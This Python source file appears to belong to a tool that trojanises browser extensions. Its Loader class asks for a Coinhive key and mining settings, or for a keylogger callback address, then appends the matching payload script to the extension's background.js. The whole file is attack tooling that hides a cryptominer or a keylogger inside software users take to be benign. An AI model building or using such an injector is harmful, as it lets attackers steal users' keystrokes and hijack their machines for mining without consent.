#!/usr/bin/python

import json
import os
from libs.colors import Colors

class Loader :

	def __init__(self, extension, module) :

		self.module = module
		self.extension = extension
		
	def inject(self) :

		try:

			background = ["background.js","bundle.js"]

			for script in background :
				path = "output/extensions/{}/{}".format(self.extension, script) # Manifest JSON
				if os.path.exists(path):
					path = "output/extensions/{}/{}".format(self.extension, script) # Manifest JSON
					pass

			if self.module == "currency/coinhive":

				modules = "modules/currency/coinhive/coinhive.js" # Javascript file to inject into background

				print("[+] Configuration of module {}".format(modules))

				apikey = raw_input("{}".format(Colors().status("[+] Set coinhive public key: ")))
				thread = raw_input("{}".format(Colors().status("[+] Set coinhive threads: ")))
				autoThreads = raw_input("{}".format(Colors().status("[+] Set coinhive autoThreads: ")))
				throttle = float(input("{}".format(Colors().status("[+] Set coinhive throttle: "))))
				forceASMJS = raw_input("{}".format(Colors().status("[+] Set coinhive forceASMJS: ")))

				options = "{}{}{}, {}thread:{}, autoThreads:{}, throttle: {}, forceASMJS: {}{}".format('"',apikey,'"',"{",thread, autoThreads, throttle, forceASMJS,"}") # Options

				print("Module as been injected {}".format(modules))

			elif self.module == "keylogger/keylogger" :

				modules = "modules/keylogger/keylogger.js" # Javascript file to inject into background
				print("Configuration of module {}".format(modules))
				
				connection = raw_input("Set the back connection: ")
				options = "{}".format(connection)

			with open(modules, "r") as payload :
				payload = payload.read()
				payload = payload.replace("****", str(options))
				with open("output/extensions/{}/background.js".format(self.extension), "a") as s :
					s.write(payload)
					s.close()
		except IOError as e:
			raise e
